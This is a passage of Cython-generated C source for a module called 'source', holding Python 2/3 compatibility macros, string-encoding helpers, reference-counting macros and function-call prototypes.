  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
  #if !defined(_USE_MATH_DEFINES)
    #define _USE_MATH_DEFINES
  #endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__source
#define __PYX_HAVE_API__source
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "source.py",
};

/*--- Type declarations ---*/
struct __pyx_obj_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4;


struct __pyx_obj_6source___pyx_scope_struct____pyx_lambda_funcdef_6source_lambda4 {
  PyObject_HEAD
  PyObject *__pyx_v_d;
};


/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  do {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* PyCFunctionFastCall.proto */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject *__Pyx_PyCFunction_FastCall(PyObject *func, PyObject **args, Py_ssize_t nargs);
#else
#define __Pyx_PyCFunction_FastCall(func, args, nargs)  (assert(0), NULL)
#endif

/* PyFunctionFastCall.proto */
#if CYTHON_FAST_PYCALL
#define __Pyx_PyFunction_FastCall(func, args, nargs)\
    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs);
#else
#define __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs) _PyFunction_FastCallDict(func, args, nargs, kwargs)
#endif
#define __Pyx_BUILD_ASSERT_EXPR(cond)\
    (sizeof(char [1 - 2*!(cond)]) - 1)
#ifndef Py_MEMBER_SIZE
#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)
#endif
#if CYTHON_FAST_PYCALL
  static size_t __pyx_pyframe_localsplus_offset = 0;
  #include "frameobject.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
  #define __Pxy_PyFrame_Initialize_Offsets()\
    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\
     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))
  #define __Pyx_PyFrame_GetLocalsplus(frame)\
    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))
#endif // CYTHON_FAST_PYCALL
#endif

/* PyObjectCall2Args.proto */
static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2);

/* PyObjectCallMethO.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);
#endif

/* PyObjectCallOneArg.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);

/* PyIntCompare.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_EqObjC(PyObject *op1, PyObject *op2, long intval, long inplace);

/* PyObjectCallNoArg.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func);
#else
#define __Pyx_PyObject_CallNoArg(func) __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL)
#endif

/* RaiseArgTupleInvalid.proto */
static void __Pyx_RaiseArgtupleInvalid(const char* func_name, int exact,
    Py_ssize_t num_min, Py_ssize_t num_max, Py_ssize_t num_found);

/* RaiseDoubleKeywords.proto */
static void __Pyx_RaiseDoubleKeywordsError(const char* func_name, PyObject* kw_name);

/* ParseKeywords.proto */
static int __Pyx_ParseOptionalKeywords(PyObject *kwds, PyObject **argnames[],\
    PyObject *kwds2, PyObject *values[], Py_ssize_t num_pos_args,\
    const char* function_name);

/* None.proto */
static CYTHON_INLINE void __Pyx_RaiseClosureNameError(const char *varname);

/* FetchCommonType.proto */
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type);

/* CythonFunctionShared.proto */
#define __Pyx_CyFunction_USED 1
#define __Pyx_CYFUNCTION_STATICMETHOD  0x01
#define __Pyx_CYFUNCTION_CLASSMETHOD   0x02
#define __Pyx_CYFUNCTION_CCLASS        0x04
#define __Pyx_CyFunction_GetClosure(f)\
    (((__pyx_CyFunctionObject *) (f))->func_closure)
#define __Pyx_CyFunction_GetClassObj(f)\
    (((__pyx_CyFunctionObject *) (f))->func_classobj)
#define __Pyx_CyFunction_Defaults(type, f)\
    ((type *)(((__pyx_CyFunctionObject *) (f))->defaults))
#define __Pyx_CyFunction_SetDefaultsGetter(f, g)\
    ((__pyx_CyFunctionObject *) (f))->defaults_getter = (g)
typedef struct {
    PyCFunctionObject func;
#if PY_VERSION_HEX < 0x030500A0
    PyObject *func_weakreflist;
#endif
    PyObject *func_dict;
    PyObject *func_name;
    PyObject *func_qualname;
    PyObject *func_doc;
    PyObject *func_globals;
    PyObject *func_code;
    PyObject *func_closure;
    PyObject *func_classobj;
    void *defaults;
    int defaults_pyobjects;
    size_t defaults_size;  // used by FusedFunction for copying defaults
    int flags;
    PyObject *defaults_tuple;
    PyObject *defaults_kwdict;
    PyObject *(*defaults_getter)(PyObject *);
    PyObject *func_annotations;
} __pyx_CyFunctionObject;
static PyTypeObject *__pyx_CyFunctionType = 0;
#define __Pyx_CyFunction_Check(obj)  (__Pyx_TypeCheck(obj, __pyx_CyFunctionType))
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject* op, PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *self,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *m,
                                                         size_t size,
                                                         int pyobjects);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *m,
                                                            PyObject *tuple);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *m,
                                                             PyObject *dict);
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *m,
                                                              PyObject *dict);
static int __pyx_CyFunction_init(void);

/* CythonFunction.proto */
static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *closure,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* PyThreadStateGet.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyThreadState_declare  PyThreadState *__pyx_tstate;
#define __Pyx_PyThreadState_assign  __pyx_tstate = __Pyx_PyThreadState_Current;
#define __Pyx_PyErr_Occurred()  __pyx_tstate->curexc_type
#else
#define __Pyx_PyThreadState_declare
#define __Pyx_PyThreadState_assign
#define __Pyx_PyErr_Occurred()  PyErr_Occurred()
#endif

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
